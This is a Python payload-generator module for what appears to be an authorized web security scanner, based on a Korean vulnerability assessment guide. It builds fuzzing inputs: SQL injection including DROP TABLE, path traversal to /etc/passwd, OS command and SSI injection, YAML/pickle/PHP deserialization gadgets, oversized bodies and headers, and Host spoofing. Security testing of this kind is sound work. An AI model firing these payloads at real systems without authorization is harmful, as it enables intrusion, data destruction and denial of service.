# =============================================================================
# payloads/sk_shielders/payload_generator.py
# SK Shielders 2022 W-1-6 진단 가이드 기반 페이로드 생성 모듈
#
# 공격 유형:
#   1. 버퍼 오버플로우 / 포맷 스트링 / 정수 오버플로우  (body injection)
#   2. 깊은 JSON 트리                                   (body injection)
#   3. 대형 JSON 배열                                   (body injection)
#   4. Multipart/Form-Data 이상 스트림                  (body injection)
#   5. GET 쿼리 파라미터 퍼징                           (query param injection) ← NEW
#   6. URL 경로 파라미터 퍼징                           (path param injection)  ← NEW
#   7. HTTP 헤더 기반 버퍼 오버플로우                   (header injection)      ← NEW
#   8. JSON 바디 역직렬화 주입                          (body deserialization)  ← NEW
#
# 출처: SK Shielders 2022 보안 취약점 진단 가이드 W-1-6
# 주의: 반드시 허가된 테스트 환경(개발/스테이징 서버)에서만 실행하세요.
# =============================================================================

import base64
import logging

logger = logging.getLogger(__name__)

SOURCE_TAG = "sk_shielders"


class SKPayloadGenerator:
    """
    SK Shielders W-1-6 진단 가이드 기반 페이로드 생성기.

    모든 페이로드 딕셔너리에는 다음 필드가 포함됩니다:
        source       : "sk_shielders" (고정)
        type         : 공격 유형 코드
        attack_vector: 주입 위치 ("body", "query", "path", "header")
        name         : 고유 페이로드 이름
        body/value   : 실제 페이로드 데이터
    """

    # =========================================================================
    # 1. 버퍼 오버플로우 / 포맷 스트링 / 정수 오버플로우
    # =========================================================================
    @staticmethod
    def buffer_overflow_payloads() -> list:
        """
        버퍼 오버플로우 / 포맷 스트링 / 정수 오버플로우 페이로드.

        공격 원리:
            - 입력 길이 미검증 시 할당된 버퍼를 초과하는 데이터를 주입
            - 포맷 스트링: printf류 함수에 %s, %x, %n 삽입 → 메모리 읽기/쓰기
            - 정수 오버플로우: INT_MAX/MIN 경계값으로 연산 오류 유발
        """
        payloads = []

        # ─── ASCII 반복 문자열 (1KB ~ 64KB) ───
        for size, label in [
            (1_000, "1KB"), (10_000, "10KB"),
            (32_768, "32KB"), (65536, "64KB"),
        ]:
            payloads.append({
                "source": SOURCE_TAG, "type": "buffer_overflow",
                "attack_vector": "body", "name": f"sk_bo_ascii_{label}",
                "body": "A" * size,
            })

        # ─── 유니코드 / 특수문자 ───
        payloads.append({"source": SOURCE_TAG, "type": "buffer_overflow",
                         "attack_vector": "body", "name": "sk_bo_korean_10KB",
                         "body": "가" * 5_000})
        payloads.append({"source": SOURCE_TAG, "type": "buffer_overflow",
                         "attack_vector": "body", "name": "sk_bo_emoji_10KB",
                         "body": "😀" * 2_500})
        for char, cname in [
            ("\x00", "null_byte"), ("\n\r", "crlf"),
            ("'\"\\", "quotes_bs"), ("<script>", "xss_tag"),
        ]:
            payloads.append({"source": SOURCE_TAG, "type": "buffer_overflow",
                             "attack_vector": "body",
                             "name": f"sk_bo_special_{cname}_10KB",
                             "body": char * (10_000 // max(len(char), 1))})

        # ─── 포맷 스트링 ───
        for fmt_str, fname in [
            ("%s" * 100, "fmt_s_100"), ("%x" * 100, "fmt_x_100"),
            ("%n" * 50, "fmt_n_50"), ("%p" * 100, "fmt_p_100"),
            ("%.2000d", "fmt_d_width"), ("%99999999d", "fmt_d_large"),
            ("AAAA" + "%x." * 100, "fmt_aaa_x"),
            ("%1!n!%2!n!%3!n!%4!n!%5!n!", "fmt_win_n"),  # Windows format
            ("%1!s!%2!s!%3!s!%4!s!%5!s!", "fmt_win_s"),  # Windows format
        ]:
            payloads.append({"source": SOURCE_TAG, "type": "buffer_overflow",
                             "attack_vector": "body", "name": f"sk_bo_{fname}",
                             "body": fmt_str})

        # ─── 정수 오버플로우 ───
        for iname, ival in [
            ("int32_max", 2_147_483_647), ("int32_min", -2_147_483_648),
            ("int64_max", 9_223_372_036_854_775_807),
            ("int64_min", -9_223_372_036_854_775_808),
            ("uint32_max", 4_294_967_295),
            ("uint64_max", 18_446_744_073_709_551_615),
            ("minus_one", -1), ("zero", 0),
            ("large_float", 1.7976931348623157e+308),
        ]:
            payloads.append({"source": SOURCE_TAG, "type": "buffer_overflow",
                             "attack_vector": "body", "name": f"sk_bo_{iname}",
                             "body": ival})

        logger.debug(f"[SK Payload] 버퍼 오버플로우: {len(payloads)}개")
        return payloads

    # =========================================================================
    # 2. 깊은 JSON 트리
    # =========================================================================
    @staticmethod
    def deep_json_payloads() -> list:
        """
        JSON 파서 재귀 한도 초과를 유발하는 깊은 중첩 구조 페이로드.

        공격 원리:
            - 수백~수천 단계 중첩으로 JSON 파서 스택 소진
            - Array bomb: [[[...]]] 형태 지수적 확장
        """
        payloads = []

        # ─── 중첩 객체 ───
        for depth, label in [(50, "50"), (200, "200")]:  # 500/1000은 로컬 서버 다운 유발로 제외
            # , (500, "500"), (1000, "1000")
            obj = {"value": "end"}
            for _ in range(depth):
                obj = {"nested": obj}
            payloads.append({"source": SOURCE_TAG, "type": "deep_json",
                             "attack_vector": "body",
                             "name": f"sk_deep_json_obj_{label}", "body": obj})

        # ─── 중첩 배열 ───
        for depth, label in [(50, "50"), (200, "200")]:  # 500은 로컬 서버 다운 유발로 제외
            # , (500, "500")
            arr = ["end"]
            for _ in range(depth):
                arr = [arr]
            payloads.append({"source": SOURCE_TAG, "type": "deep_json",
                             "attack_vector": "body",
                             "name": f"sk_deep_json_arr_{label}", "body": arr})

        # ─── Array Bomb — 2^20 원소 생성으로 로컬 서버 즉시 다운 유발, 제외 ───
        # bomb = [0, 0]
        # for _ in range(20):
        #     bomb = [bomb, bomb]
        # payloads.append({"source": SOURCE_TAG, "type": "deep_json",
        #                  "attack_vector": "body",
        #                  "name": "sk_deep_json_array_bomb_2pow20", "body": bomb})

        # ─── 혼합 중첩 — 10단계 × 3배 재귀 구조로 로컬 서버 다운 유발, 제외 ───
        # mixed = {"data": [{"item": [{"v": "x"}] * 100}] * 100}
        # for _ in range(10):
        #     mixed = {"w": [mixed] * 3}
        # payloads.append({"source": SOURCE_TAG, "type": "deep_json",
        #                  "attack_vector": "body",
        #                  "name": "sk_deep_json_mixed", "body": mixed})

        logger.debug(f"[SK Payload] 깊은 JSON: {len(payloads)}개")
        return payloads

    # =========================================================================
    # 3. 대형 JSON 배열
    # =========================================================================
    @staticmethod
    def large_json_array_payloads() -> list:
        """
        넓고 큰 JSON 구조로 메모리를 소진시키는 페이로드.

        공격 원리:
            - 키가 수만 개인 넓은 객체로 파서 메모리 고갈
            - 수십만 원소 배열로 메모리 할당 초과
            - 중복 키로 파서 동작 예측 불가
        """
        payloads = []

        # ─── 넓은 객체 ───
        for count, label in [(1_000, "1K"), (10_000, "10K"), (100_000, "100K")]:
            wide_obj = {f"key_{i}": f"val_{i}" for i in range(count)}
            payloads.append({"source": SOURCE_TAG, "type": "large_json_array",
                             "attack_vector": "body",
                             "name": f"sk_large_json_wide_{label}", "body": wide_obj})

        # ─── 대형 배열 ───
        for count, label in [(1_000, "1K"), (10_000, "10K"), (100_000, "100K")]:
            arr = [{"id": i, "data": "x" * 100} for i in range(count)]
            payloads.append({"source": SOURCE_TAG, "type": "large_json_array",
                             "attack_vector": "body",
                             "name": f"sk_large_json_array_{label}", "body": arr})

        # ─── 중복 키 ───
        dup_count = 10_000
        dup_pairs = ", ".join(f'"key": "value_{i}"' for i in range(dup_count))
        payloads.append({"source": SOURCE_TAG, "type": "large_json_array",
                         "attack_vector": "body",
                         "name": f"sk_large_json_dup_keys_{dup_count}",
                         "body": "{" + dup_pairs + "}", "raw_string": True})

        # ─── 혼합 타입 배열 ───
        mixed = [None if i % 4 == 0 else True if i % 4 == 1
                 else i if i % 4 == 2 else "x" * 10 for i in range(50_000)]
        payloads.append({"source": SOURCE_TAG, "type": "large_json_array",
                         "attack_vector": "body",
                         "name": "sk_large_json_mixed_50K", "body": mixed})

        logger.debug(f"[SK Payload] 대형 JSON 배열: {len(payloads)}개")
        return payloads

    # =========================================================================
    # 4. Multipart/Form-Data 이상 스트림
    # =========================================================================
    @staticmethod
    def multipart_payloads() -> list:
        """
        Multipart 업로드를 이용한 이상 스트림 페이로드.

        공격 원리:
            - 대용량 파트: 허용 크기 초과 업로드
            - 파트 폭탄: 수천 개 작은 파트 동시 전송
            - 비정상 boundary: 파서 오류 유발
            - 역직렬화 매직 바이트: Java/Python/PHP 직렬화 데이터 전송
        """
        payloads = []
        boundary = "----ARGUSSKBoundary"

        def make_part(name, filename, ctype, data):
            return (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'
                f"Content-Type: {ctype}\r\n\r\n{data}\r\n"
            )

        # 대용량 파트 — 로컬 서버 다운 유발로 제외
        # for size, label in [(1_000_000, "1MB"), (10_000_000, "10MB")]:
        #     body = make_part("file", "large.txt", "text/plain", "A" * size)
        #     body += f"--{boundary}--\r\n"
        #     payloads.append({"source": SOURCE_TAG, "type": "multipart",
        #                      "attack_vector": "body",
        #                      "name": f"sk_multipart_large_{label}", "body": body,
        #                      "boundary": boundary,
        #                      "content_type": f"multipart/form-data; boundary={boundary}"})

        # 파트 폭탄 (10,000개)
        bomb = "".join(make_part(f"f{i}", f"f{i}.txt", "text/plain", f"d{i}")
                       for i in range(10_000))
        bomb += f"--{boundary}--\r\n"
        payloads.append({"source": SOURCE_TAG, "type": "multipart",
                         "attack_vector": "body",
                         "name": "sk_multipart_part_bomb_10K", "body": bomb,
                         "boundary": boundary,
                         "content_type": f"multipart/form-data; boundary={boundary}"})

        # 비정상 boundary
        long_bd = "B" * 8192
        payloads.append({"source": SOURCE_TAG, "type": "multipart",
                         "attack_vector": "body",
                         "name": "sk_multipart_long_boundary_8192",
                         "body": f"--{long_bd}\r\nContent-Disposition: form-data; name=\"f\"\r\n\r\ndata\r\n--{long_bd}--\r\n",
                         "boundary": long_bd,
                         "content_type": f"multipart/form-data; boundary={long_bd}"})

        # Java 역직렬화 매직 바이트 (0xACED 0x0005)
        java_magic = b"\xac\xed\x00\x05sr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x01"
        header_bytes = f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"evil.ser\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()
        payloads.append({"source": SOURCE_TAG, "type": "multipart",
                         "attack_vector": "body",
                         "name": "sk_multipart_java_deserialization",
                         "body_bytes": header_bytes + java_magic + f"\r\n--{boundary}--\r\n".encode(),
                         "boundary": boundary,
                         "content_type": f"multipart/form-data; boundary={boundary}"})

        # Python pickle 매직 바이트 (0x80 0x04)
        pickle_magic = b"\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00."
        payloads.append({"source": SOURCE_TAG, "type": "multipart",
                         "attack_vector": "body",
                         "name": "sk_multipart_python_pickle",
                         "body_bytes": f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"evil.pkl\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()
                                       + pickle_magic + f"\r\n--{boundary}--\r\n".encode(),
                         "boundary": boundary,
                         "content_type": f"multipart/form-data; boundary={boundary}"})

        # PHP 직렬화 페이로드
        php_serial = 'O:8:"stdClass":1:{s:4:"exec";s:6:"id 2>&1";}'
        body = make_part("data", "evil.php", "application/x-php-serialized", php_serial)
        body += f"--{boundary}--\r\n"
        payloads.append({"source": SOURCE_TAG, "type": "multipart",
                         "attack_vector": "body",
                         "name": "sk_multipart_php_serialized",
                         "body": body, "boundary": boundary,
                         "content_type": f"multipart/form-data; boundary={boundary}"})

        logger.debug(f"[SK Payload] Multipart: {len(payloads)}개")
        return payloads

    # =========================================================================
    # 5. GET 쿼리 파라미터 퍼징  ← NEW
    # =========================================================================
    @staticmethod
    def get_query_param_payloads() -> list:
        """
        GET 요청 쿼리 파라미터에 버퍼 오버플로우 / 인젝션 페이로드 주입.

        공격 원리:
            - 쿼리 파라미터가 길이 검증 없이 백엔드 처리될 때 오버플로우 유발
            - 포맷 스트링, SQL 특수문자 등을 URL 파라미터로 전송

        attack_vector: "query"
        value: 쿼리 파라미터 값 (각 파라미터에 대입)
        """
        payloads = []
        entries = [
            ("A" * 10_000,         "overflow_10KB"),
            ("A" * 100_000,        "overflow_100KB"),
            ("%s" * 100,           "fmt_s_100"),
            ("%n" * 50,            "fmt_n_50"),
            ("%x" * 100,           "fmt_x_100"),
            ("'" + "A" * 1000,     "sql_quote_1KB"),
            ("' OR '1'='1",        "sql_or_true"),
            ("' OR '1'='1'--",     "sql_or_comment"),
            ("; DROP TABLE users;--", "sql_drop"),
            ("1 AND 1=1",          "sql_and_true"),
            ("1 AND 1=2",          "sql_and_false"),
            ("../../../etc/passwd","path_traversal"),
            ("../../windows/win.ini", "path_traversal_win"),
            ("1%00",               "null_byte_termination"),
            ("<script>alert(1)</script>", "xss_basic"),
            ("{{7*7}}",            "ssti_basic"),           # SSTI
            ("${7*7}",             "ssti_el"),               # EL injection
            ("| ls -la",           "os_cmd_pipe"),
            ("; cat /etc/passwd",  "os_cmd_semicolon"),
            ("`id`",               "os_cmd_backtick"),
            ("<!--#exec cmd='id'-->", "ssi_exec"),
            ("0" * 50_000,         "zero_fill_50KB"),
            (str(2**31 - 1),       "int_max"),
            (str(-2**31),          "int_min"),
            ("9" * 100,            "large_num_100"),
        ]
        for value, name in entries:
            payloads.append({"source": SOURCE_TAG, "type": "get_query_param",
                             "attack_vector": "query",
                             "name": f"sk_query_{name}", "value": value})
        logger.debug(f"[SK Payload] GET 쿼리 파라미터: {len(payloads)}개")
        return payloads

    # =========================================================================
    # 6. URL 경로 파라미터 퍼징  ← NEW
    # =========================================================================
    @staticmethod
    def path_param_payloads() -> list:
        """
        URL 경로 파라미터 {id}, {name} 위치에 페이로드 주입.

        예) /api/users/{id} → /api/users/1 OR 1=1

        attack_vector: "path"
        value: 경로 파라미터 대체 값
        """
        payloads = []
        entries = [
            ("' OR '1'='1",         "sql_or_true"),
            ("' OR '1'='1'--",      "sql_or_comment"),
            ("1 AND 1=1",           "sql_and_true"),
            ("../../../etc/passwd", "path_traversal"),
            ("..%2F..%2F..%2Fetc%2Fpasswd", "path_traversal_encoded"),
            ("0",                   "zero_id"),
            ("-1",                  "negative_id"),
            (str(2**31 - 1),        "int_max"),
            (str(2**63 - 1),        "int64_max"),
            ("A" * 10_000,          "overflow_10KB"),
            ("%s%s%s%s%s",          "fmt_string"),
            ("*",                   "wildcard"),
            ("null",                "null_string"),
            ("undefined",           "undefined_string"),
            ("true",                "bool_true"),
            ("false",               "bool_false"),
            ("NaN",                 "nan"),
            ("Infinity",            "infinity"),
            ("<script>alert(1)</script>", "xss"),
            ("{{7*7}}",             "ssti"),
            ("${7*7}",              "el_injection"),
            ("1; DROP TABLE users;", "sql_drop"),
            ("1%00",                "null_byte"),
            ("admin",               "role_escalation"),
            ("999999999",           "large_id"),
        ]
        for value, name in entries:
            payloads.append({"source": SOURCE_TAG, "type": "path_param",
                             "attack_vector": "path",
                             "name": f"sk_path_{name}", "value": value})
        logger.debug(f"[SK Payload] 경로 파라미터: {len(payloads)}개")
        return payloads

    # =========================================================================
    # 7. HTTP 헤더 기반 버퍼 오버플로우  ← NEW
    # =========================================================================
    @staticmethod
    def header_overflow_payloads() -> list:
        """
        HTTP 헤더를 통한 버퍼 오버플로우 / 인젝션 페이로드.

        공격 원리:
            - 헤더 파서가 길이를 제한하지 않을 때 오버플로우 유발
            - User-Agent, X-Forwarded-For, Referer 등을 통한 인젝션
            - SSI 인젝션: Referer/User-Agent에 <!--#exec--> 삽입

        attack_vector: "header"
        headers: 주입할 헤더 딕셔너리
        """
        payloads = []

        # User-Agent 과부하 — 1MB는 로컬 서버 다운 유발로 제외
        for size, label in [(10_000, "10KB"), (100_000, "100KB")]:  # (1_000_000, "1MB") 제외
            payloads.append({"source": SOURCE_TAG, "type": "header_overflow",
                             "attack_vector": "header",
                             "name": f"sk_header_ua_overflow_{label}",
                             "headers": {"User-Agent": "A" * size}})

        # User-Agent 포맷 스트링
        payloads.append({"source": SOURCE_TAG, "type": "header_overflow",
                         "attack_vector": "header",
                         "name": "sk_header_ua_fmt_string",
                         "headers": {"User-Agent": "%s%s%s%s%n%n%n%n%x%x%x%x" * 20}})

        # Referer SSI 인젝션
        for ssi_payload, sname in [
            ('<!--#exec cmd="/bin/ps ax"-->', "ssi_exec_ps"),
            ('<!--#include virtual="/etc/passwd"-->', "ssi_include_passwd"),
            ('<!--#echo var="DOCUMENT_ROOT"-->', "ssi_echo_docroot"),
        ]:
            payloads.append({"source": SOURCE_TAG, "type": "header_overflow",
                             "attack_vector": "header",
                             "name": f"sk_header_referer_{sname}",
                             "headers": {"Referer": ssi_payload}})

        # User-Agent SSI 인젝션
        payloads.append({"source": SOURCE_TAG, "type": "header_overflow",
                         "attack_vector": "header",
                         "name": "sk_header_ua_ssi",
                         "headers": {"User-Agent": '<!--#include virtual="/proc/version"-->'}})

        # X-Forwarded-For 인젝션
        for xip, xname in [
            ("' OR '1'='1", "sql_injection"),
            ("127.0.0.1' OR '1'='1", "sql_loopback"),
            ("A" * 10_000, "overflow_10KB"),
        ]:
            payloads.append({"source": SOURCE_TAG, "type": "header_overflow",
                             "attack_vector": "header",
                             "name": f"sk_header_xff_{xname}",
                             "headers": {"X-Forwarded-For": xip}})

        # Host 헤더 인젝션
        for hval, hname in [
            ("evil.com", "host_spoofing"),
            ("evil.com\r\nX-Injected: true", "host_crlf"),
            ("A" * 10_000, "host_overflow"),
        ]:
            payloads.append({"source": SOURCE_TAG, "type": "header_overflow",
                             "attack_vector": "header",
                             "name": f"sk_header_host_{hname}",
                             "headers": {"Host": hval}})

        # Content-Length 조작
        for clen, clname in [
            ("-1", "negative"), (str(2**32), "uint32_overflow"),
            (str(2**63), "int64_overflow"),
        ]:
            payloads.append({"source": SOURCE_TAG, "type": "header_overflow",
                             "attack_vector": "header",
                             "name": f"sk_header_content_length_{clname}",
                             "headers": {"Content-Length": clen}})

        # 커스텀 헤더 퍼징
        payloads.append({"source": SOURCE_TAG, "type": "header_overflow",
                         "attack_vector": "header",
                         "name": "sk_header_custom_overflow",
                         "headers": {
                             "X-Custom-Header": "A" * 10_000,
                             "X-Api-Key": "' OR '1'='1",
                             "X-Auth-Token": "A" * 5_000,
                         }})

        logger.debug(f"[SK Payload] HTTP 헤더: {len(payloads)}개")
        return payloads

    # =========================================================================
    # 8. JSON 바디 역직렬화 주입  ← NEW
    # =========================================================================
    @staticmethod
    def json_deserialization_payloads() -> list:
        """
        JSON 바디 내 역직렬화 페이로드 주입 (base64 인코딩).

        공격 원리:
            - Java ObjectInputStream: 0xACED0005 매직 바이트로 시작하는 직렬화 데이터
            - Python pickle: 0x80 0x04 또는 0x80 0x02 매직 바이트
            - PHP unserialize(): O:8:"ClassName":... 형태 문자열
            - YAML unsafe deserialization: !!python/object 태그
            - JSON에 base64 인코딩된 형태로 전송

        attack_vector: "body"
        """
        payloads = []

        # Java 역직렬화 페이로드 (CommonsCollections 계열)
        java_payloads = [
            # 기본 ObjectOutputStream 헤더
            b"\xac\xed\x00\x05sr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x01",
            # LinkedList 직렬화 헤더
            b"\xac\xed\x00\x05sr\x00\x0fjava.util.LinkedList\x0c\xc7\x47\x43\xba\x0e\xc7\xf2\x03\x00\x00xp",
            # HashMap 직렬화 헤더
            b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0c",
        ]
        for i, java_bytes in enumerate(java_payloads):
            b64 = base64.b64encode(java_bytes).decode()
            payloads.append({"source": SOURCE_TAG, "type": "json_deserialization",
                             "attack_vector": "body",
                             "name": f"sk_deser_java_{i+1}",
                             "body": {"data": b64, "_type": "java.io.Serializable"},
                             "deser_type": "java"})

        # Python pickle 페이로드
        python_payloads = [
            b"\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00.",  # empty
            b"\x80\x02\x5d\x71\x00.",                             # empty list
            b"\x80\x04\x95\x14\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04eval\x94\x93\x94.",  # eval reference
        ]
        for i, pkl_bytes in enumerate(python_payloads):
            b64 = base64.b64encode(pkl_bytes).decode()
            payloads.append({"source": SOURCE_TAG, "type": "json_deserialization",
                             "attack_vector": "body",
                             "name": f"sk_deser_python_pickle_{i+1}",
                             "body": {"data": b64, "_type": "pickle"},
                             "deser_type": "python"})

        # PHP 역직렬화 페이로드
        php_payloads = [
            'O:8:"stdClass":1:{s:4:"exec";s:6:"id 2>&1";}',
            'a:2:{i:0;s:4:"data";i:1;s:7:"payload";}',
            'O:19:"GuzzleHttp\\Cookie":2:{s:11:"name";s:6:"stolen";s:5:"value";s:10:"admin=true";}',
            's:18:"<?php phpinfo(); ?>";',
        ]
        for i, php_str in enumerate(php_payloads):
            payloads.append({"source": SOURCE_TAG, "type": "json_deserialization",
                             "attack_vector": "body",
                             "name": f"sk_deser_php_{i+1}",
                             "body": {"data": php_str, "type": "php_serialized"},
                             "deser_type": "php"})

        # YAML unsafe deserialization
        yaml_payloads = [
            "!!python/object/apply:os.system ['id']",
            "!!python/object/apply:subprocess.check_output [['id']]",
            "!!java.lang.ProcessBuilder [['id']]",
        ]
        for i, yaml_str in enumerate(yaml_payloads):
            payloads.append({"source": SOURCE_TAG, "type": "json_deserialization",
                             "attack_vector": "body",
                             "name": f"sk_deser_yaml_{i+1}",
                             "body": {"data": yaml_str, "format": "yaml"},
                             "deser_type": "yaml"})

        # Content-Type 혼동 (multipart처럼 보이지만 JSON 역직렬화)
        payloads.append({"source": SOURCE_TAG, "type": "json_deserialization",
                         "attack_vector": "body",
                         "name": "sk_deser_type_confusion",
                         "body": {"__class__": "subprocess.Popen",
                                  "__args__": ["id"],
                                  "__kwargs__": {"shell": True}},
                         "deser_type": "class_instantiation"})

        logger.debug(f"[SK Payload] JSON 역직렬화: {len(payloads)}개")
        return payloads

    # =========================================================================
    # 전체 페이로드 반환
    # =========================================================================
    def get_all_payloads(self) -> list:
        """
        SK Shielders W-1-6 8가지 공격 유형의 모든 페이로드를 반환합니다.
        """
        all_payloads = (
            self.buffer_overflow_payloads()
            + self.deep_json_payloads()
            + self.large_json_array_payloads()
            + self.multipart_payloads()
            + self.get_query_param_payloads()
            + self.path_param_payloads()
            + self.header_overflow_payloads()
            + self.json_deserialization_payloads()
        )
        logger.info(f"[SK Payload] 전체 페이로드 수: {len(all_payloads)}")
        return all_payloads
